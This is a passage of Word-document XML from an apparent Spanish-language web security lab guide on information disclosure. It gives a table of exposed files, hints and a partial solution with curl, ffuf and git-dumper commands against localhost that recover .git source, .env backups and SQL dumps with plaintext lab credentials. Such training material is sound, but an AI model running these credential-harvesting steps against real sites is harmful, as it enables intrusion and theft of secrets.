          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Que expone</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Para que sirve</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/robots.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Disallow con todas las rutas "secretas"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Mapa del lab</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/sitemap.xml</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>URLs publicas + legacy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Inventario inicial</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/.well-known/security.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Apunta a swagger y openapi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Pista para Fase 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/.git/HEAD</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/.git/config</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/.git/logs/HEAD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Codigo recuperable, remote URL interna, historial de commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Reconstruir codigo, ver </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>JWT_SECRET=crypto123</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/.env.bak</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/.env.old</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Credenciales rotadas pero validas, master keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Acceso a debug.php, RCE en exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/.DS_Store</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Listado de archivos del Mac del dev</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Nombres internos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/notes.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Tokens hardcoded, headers magicos, query params ocultos</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Insumo para Fases 2, 3 y 4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/TODO.md</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Lista de cosas que el dev no termino de proteger</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Insumo para todas las fases</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/composer.json</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/composer.lock</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Versiones de libs con CVE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Componentes vulnerables</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/backup.sql</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/backup/db_*.sql</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Dump con </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>password_plain</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> y </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>private_key</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Login directo + claves</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/phpinfo.php</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/info.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>phpinfo()</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> completo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Variables de entorno, paths, modulos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/test.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Imprime DB_PASS, JWT_SECRET, conexion DB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Credenciales en claro</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/adminer.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Login a MySQL con credenciales en HTML comment</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Acceso directo a la DB</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dificultad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Baja</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - solo requiere ejecutar fuzzing con wordlists publicos y leer respuestas con calma.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 1 - Empezar por robots.txt y sitemap.xml</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s http://localhost:8080/robots.txt</w:t>
        <w:br/>
        <w:t>curl -s http://localhost:8080/sitemap.xml</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>robots.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tiene una lista exhaustiva de Disallow. El staff lo escribio pensando que "ocultaba" las rutas, pero hizo lo opuesto: las publico.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 2 - Fuzzing de archivos backup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ffuf -w SecLists/Discovery/Web-Content/raft-medium-files.txt \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -u http://localhost:8080/FUZZ \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -mc 200,301,302 \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -fs 0 \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -of csv -o recon.csv</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Los hits interesantes seran: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.env.bak</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.env.old</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>notes.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>TODO.md</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>backup.sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>phpinfo.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>info.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>test.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>adminer.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>composer.json</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>composer.lock</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.DS_Store</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 3 - Recuperar el codigo via .git/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Verificar que .git/ esta expuesto</w:t>
        <w:br/>
        <w:t>curl -s http://localhost:8080/.git/HEAD</w:t>
        <w:br/>
        <w:t>curl -s http://localhost:8080/.git/config</w:t>
        <w:br/>
        <w:t>curl -s http://localhost:8080/.git/logs/HEAD</w:t>
        <w:br/>
        <w:br/>
        <w:t># El log de commits ya da pistas:</w:t>
        <w:br/>
        <w:t># "commit: hotfix - hardcoded JWT_SECRET=crypto123 in jwt.php"</w:t>
        <w:br/>
        <w:t># "commit: deploy v2 beta of /api/v2/auth/login.php (no rate limit)"</w:t>
        <w:br/>
        <w:t># "commit: add /api/v3/admin/exec.php for internal devops use - DO NOT MERGE TO PROD"</w:t>
        <w:br/>
        <w:br/>
        <w:t># Para descargar el repo completo (cuando hay objects/):</w:t>
        <w:br/>
        <w:t>pip install git-dumper</w:t>
        <w:br/>
        <w:t>git-dumper http://localhost:8080/.git/ ./recovered/</w:t>
        <w:br/>
        <w:t>cd recovered &amp;&amp; git log --oneline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 4 - Backups de DB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Dump principal</w:t>
        <w:br/>
        <w:t>curl -s http://localhost:8080/backup.sql | grep INSERT</w:t>
        <w:br/>
        <w:br/>
        <w:t># Resultado: usuarios con password_plain</w:t>
        <w:br/>
        <w:t># admin / admin123</w:t>
        <w:br/>
        <w:t># devops_internal / devops_master_2024!</w:t>
        <w:br/>
        <w:t># qa_bot / qa_bot_static_pass</w:t>
        <w:br/>
        <w:br/>
        <w:t># Dump diario (cron del docroot)</w:t>
        <w:br/>
        <w:t>curl -s http://localhost:8080/backup/db_2026-04-15.sql</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Los dumps tambien revelan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>arquitectura interna</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: hostnames </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>10.0.1.50</w:t>
      </w:r>
      <w:r>
        <w:t>, IAM role ARN, S3 buckets de backups y de KYC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 5 - Listado de directorios</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Apache puede tener Options +Indexes en /uploads/ y /backup/</w:t>
        <w:br/>
        <w:t>curl -s http://localhost:8080/uploads/</w:t>
        <w:br/>
        <w:t>curl -s http://localhost:8080/uploads/kyc/</w:t>
        <w:br/>
        <w:t>curl -s http://localhost:8080/backup/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Si listing esta habilitado, podes descargar imagenes de KYC de otros usuarios (refuerza LAB01 BOLA).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion Resumida</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1: Recon basico</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>TARGET=http://localhost:8080</w:t>
        <w:br/>
        <w:br/>
        <w:t># robots y sitemap</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/robots.txt</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/sitemap.xml</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/.well-known/security.txt</w:t>
        <w:br/>
        <w:br/>
        <w:t># git</w:t>
        <w:br/>
        <w:t>for f in HEAD config description logs/HEAD info/exclude COMMIT_EDITMSG refs/heads/main; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "=== /.git/$f ==="</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl -s $TARGET/.git/$f</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2: Fuzzing automatizado</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -u $TARGET/FUZZ \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -mc 200 -fs 0 -t 50 \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -e .bak,.old,.swp,~ \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -of csv -o recon_files.csv</w:t>
        <w:br/>
        <w:br/>
        <w:t>ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -u $TARGET/FUZZ/ \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -mc 200,301,403 -t 50 \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -of csv -o recon_dirs.csv</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 3: Extraer credenciales</w:t>
      </w:r>
    </w:p>
